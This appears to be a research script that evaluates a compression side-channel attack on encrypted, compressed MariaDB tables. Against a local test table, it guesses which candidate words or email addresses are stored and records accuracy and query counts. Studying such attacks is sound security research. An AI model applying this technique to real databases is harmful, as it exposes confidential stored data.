import utils.mariadb_utils as utils
import dbreacher
import dbreacher_impl
import decision_attacker_grouping
import random
import string
import time
import sys
import numpy as np

maxRowSize = 200

control = utils.MariaDBController("testdb")

table = "victimtable"
control.drop_table(table)
control.create_basic_table(table,
            varchar_len=maxRowSize,
        compressed=True,
        encrypted=True)

possibilities = []

if sys.argv[1] == "--random":
    with open("/home/britney/dbreach-britney/resources/random-dataset.txt") as f:
        for line in f:
            word = line.strip().lower()
            possibilities.append(word)
if sys.argv[1] == "--english":
    with open("/home/britney/dbreach-britney/resources/english-dataset.txt") as f:
        for line in f:
            word = line.strip().lower()
            possibilities.append(word)
if sys.argv[1] == "--emails":
    with open("/home/britney/dbreach-britney/resources/emails-dataset.txt") as f:
        for line in f:
            email = line.strip().lower()
            possibilities.append(email)

print("num_secrets,true_label,guess_label")

def runDecisionAttack(num_secrets, setupEnd, setupStart, attacker, guesses, correct_guesses):
    attacker.bytesShrunk = dict()
    attacker.bYesReferenceScores = dict()
    attacker.bNoReferenceScores = dict()
    attacker.calculateReferenceScores(guesses)
    attacker.tryGroupedGuesses(guesses)
    refScores = attacker.getGuessAndReferenceScores()
    new_trials = []
    for guess, score_tuple in refScores:
            label = 0
            if guess in correct_guesses:
                label = 1
            new_trials.append([label, num_secrets, score_tuple[0], score_tuple[1], score_tuple[2], setupEnd - setupStart, (end-setupEnd)/num_secrets])
    
    # initial finding of ones that are true
    true_labels = []
    ref_scores = []
    setup_times = []
    guess_times = []
    for trial in new_trials:
        if(trial[0] == 0 or trial[0] == 1):
            true_labels.append(int(trial[0]))
            ref_scores.append((int(trial[2]) if trial[2] != 0 else 1, int(trial[3]), int(trial[4])))
        else:
            pass
        setup_times.append(float(trial[5]))
        guess_times.append(float(trial[6]))
    true_labels = np.array(true_labels)
    pcts = [1 - (b - b_yes) / b_no for b_no, b, b_yes in ref_scores]
    threshold = 0.65

    guess_index = 0
    trial_index = 0
    for pct in pcts:
        if pct >= threshold:
            print(str(num_secrets)+","+str(new_trials[trial_index][0])+",1")
        else:
            print(str(num_secrets)+","+str(new_trials[trial_index][0])+",0")
        guess_index += 1
        trial_index += 1

def outputWrongGuesses(num_secrets, setupEnd, setupStart, attacker, guesses, trial_index, trials):
    current_trial = trials[trial_index]
    for guess in guesses:
        label = 1 if guess in correct_guesses else 0
        print(str(num_secrets)+","+str(label)+",0")

secrets_to_try = [20, 40, 60, 80, 100, 120, 140, 160, 180, 200, 220]
secrets_to_try = [20, 40, 60, 80, 100, 120, 140, 160, 180, 200, 220, 240]
secrets_to_try = [100]
secrets_to_try.reverse()
startAttack = time.time()
for i in range(1, 6):
    print("PERCENT IN TABLE OF 100: " + str(i))
    for trial in range(0, 50):
        random.shuffle(possibilities)
        trial_possibilities = possibilities[0:100]
        success = False
        control.drop_table(table)
        control.create_basic_table(table,
            varchar_len=maxRowSize,
            compressed=True,
            encrypted=True)
        guesses = []
        guesses_grouped = []
        word_groups = {}
        correct_guesses = set()
        correct_guesses_grouped = set()
        group_count = 1
        group_word = ''
        for secret_idx in range(i):
            secret = trial_possibilities[(trial + secret_idx) % len(trial_possibilities)]
            control.insert_row(table, secret_idx, secret)
            guesses.append(secret)
            correct_guesses.add(secret)

        for secret_idx in range(i, 100):
            wrong_guess = trial_possibilities[(trial + secret_idx) % len(trial_possibilities)]
            guesses.append(wrong_guess)


        random.shuffle(guesses)
        group_count = 1
        group_word = ''
        group_words = []
        for guess in guesses:
            if group_count < 2:
                group_word += guess
                group_count += 1
                group_words.append(guess)
            else:
                group_word += guess
                group_words.append(guess)
                guesses_grouped.append(group_word)
                word_groups[group_word] = group_words
                group_count = 1
                group_word = ''
                group_words = []

        fillerCharSet = string.printable.replace(string.ascii_lowercase, '').replace('*', '')
        if sys.argv[1] == "--emails":
            fillerCharSet = fillerCharSet.replace('_', '').replace('.', '').replace('@', '')
        dbreacher = dbreacher_impl.DBREACHerImpl(control, table, i, maxRowSize, fillerCharSet, ord('*'))

        startRound = time.time()

        attacker = decision_attacker_grouping.decisionAttacker(dbreacher, guesses)
        while not success:
            curr_db_count = dbreacher.db_count
            setupStart = time.time()
            success = attacker.setUp()
            setupEnd = time.time()
            dbreacher.db_setup_count += dbreacher.db_count - curr_db_count
            curr_db_count = dbreacher.db_count
            if success:
                success = attacker.calculateReferenceScores(guesses_grouped)
            if success:
                success = attacker.tryGroupedGuesses(guesses_grouped)
            end = time.time()
            dbreacher.db_grouping_count += dbreacher.db_count - curr_db_count
        refScores = attacker.getGuessAndReferenceScores()

        trials = []
        for guess, score_tuple in refScores:
            in_group = 0
            for word in word_groups[guess]:
                if word in correct_guesses:
                    in_group = 1
                    break
            label = in_group 
            trials.append([label, i, score_tuple[0], score_tuple[1], score_tuple[2], setupEnd - setupStart, (end-setupEnd)/i])

        # initial finding of ones that are true
        true_labels = []
        ref_scores = []
        setup_times = []
        guess_times = []
        for trial in trials:
            if(trial[0] == 0 or trial[0] == 1):
                true_labels.append(int(trial[0]))
                ref_scores.append((int(trial[2]) if trial[2] != 0 else 1, int(trial[3]), int(trial[4])))
            else:
                pass
            setup_times.append(float(trial[5]))
            guess_times.append(float(trial[6]))
        true_labels = np.array(true_labels)
        pcts = [1 - (b - b_yes) / b_no for b_no, b, b_yes in ref_scores]

        threshold = 0.39

        guess_index = 0
        trial_index = 0

        num_groups = len(pcts)
        num_groups_indvidually_tested = 0

        for pct in pcts:
            if pct >= threshold:
                curr_db_count = dbreacher.db_count
                num_groups_indvidually_tested += 1
                runDecisionAttack(i, setupEnd, setupStart, attacker, word_groups[guesses_grouped[guess_index]], correct_guesses)
                dbreacher.db_individual_guess_count += dbreacher.db_count - curr_db_count
            else:
                outputWrongGuesses(i, setupEnd, setupStart, attacker, word_groups[guesses_grouped[guess_index]], trial_index, trials)
            guess_index += 1
            trial_index += 1
        endRound = time.time()

        print("groups,individually_tested_groups")
        print(str(num_groups) + "," + str(num_groups_indvidually_tested))
        print("setup_queries,grouping_queries,individual_guess_queries,reference_score_queries,guess_score_queries,total_queries")
        print(str(dbreacher.db_setup_count) + "," + str(dbreacher.db_grouping_count)+","+str(dbreacher.db_individual_guess_count)+","+str(dbreacher.db_ref_score_count)+","+str(dbreacher.db_guess_count)+","+str(dbreacher.db_count))
